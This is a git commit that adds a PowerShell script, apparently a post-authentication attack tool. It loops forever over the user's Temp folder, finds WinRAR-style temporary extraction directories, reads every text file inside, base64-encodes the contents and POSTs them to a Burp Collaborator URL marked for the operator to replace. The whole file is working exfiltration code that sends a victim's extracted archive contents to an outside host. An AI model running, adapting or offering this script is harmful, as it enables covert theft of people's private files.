351fad35b8b186f5352e49b4459c2e3475ffa54e
Qeisi <84850150+Qeisi@users.noreply.github.com>
2021-05-26 15:40:41 +0300

    Add files via upload

---
+++ 7zipPostAuth.ps1
@@ -0,0 +1,36 @@
+# Author: Abdullah Alqeisi
+
+$temp = $env:Username
+$temp = $temp.toCharArray()
+$username = ""
+
+foreach ($letter in $temp) {
+ 	if($letter -ne ' '){$username += $letter}
+  	if($letter -eq ' '){break}
+}
+
+while(1) {
+
+if(Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp | Where-Object { $_.Name -match 'Rar.........\..' }){
+
+	foreach ($directory in (Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp | Where-Object { $_.Name -match 'Rar.........\..' })){
+
+		foreach ($filename in Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp\$directory\*.txt){
+
+			$filecontent= Get-Content $filename
+			$filecontentbytes = [System.Text.Encoding]::UTF8.GetBytes($filecontent)
+			$B64EncodedContent = [System.Convert]::ToBase64String($filecontentbytes)
+
+			$target = "https://fo70z55wxi56zxob33p9oiq8hznpbe.burpcollaborator.net"  #CHANGE ME
+			$postParams = @{payload=$B64EncodedContent}
+			Invoke-WebRequest -Uri $target -Method POST -Body $postParams
+
+}
+
+}
+
+}
+
+}
+
+
